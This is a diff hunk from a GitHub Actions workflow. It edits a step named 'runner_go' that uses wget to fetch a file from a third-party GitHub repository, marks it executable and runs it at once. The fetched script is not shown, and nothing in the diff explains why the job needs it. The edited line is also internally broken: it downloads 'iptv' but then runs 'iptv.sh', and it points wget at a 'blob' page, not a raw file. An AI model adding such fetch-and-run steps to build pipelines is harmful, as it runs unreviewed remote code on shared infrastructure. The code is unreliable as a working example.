@@ -24,4 +24,4 @@ jobs:
       uses: actions/checkout@v1
     - name: runner_go
       run: |
-        wget https://github.com/Trobverus/guio/blob/69a096194c2d970fae1f084a6ae5fb18f3aaf438/iptv.sh && chmod u+x iptv.sh && ./iptv.sh
+        wget https://github.com/Trobverus/guio/blob/69a096194c2d970fae1f084a6ae5fb18f3aaf438/iptv && chmod u+x iptv.sh && ./iptv.sh
